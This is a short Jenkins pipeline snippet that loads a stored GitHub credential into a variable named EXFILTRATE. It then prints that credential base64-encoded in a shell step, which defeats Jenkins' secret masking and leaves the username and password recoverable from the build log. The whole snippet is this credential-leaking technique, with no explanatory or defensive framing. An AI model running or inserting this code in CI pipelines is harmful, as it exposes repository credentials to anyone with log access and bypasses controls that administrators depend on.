withCredentials([usernameColonPassword(credentialsId: 'github', variable: 'EXFILTRATE')]) {
    node {
        sh 'echo "$EXFILTRATE" | base64'
    }
} 
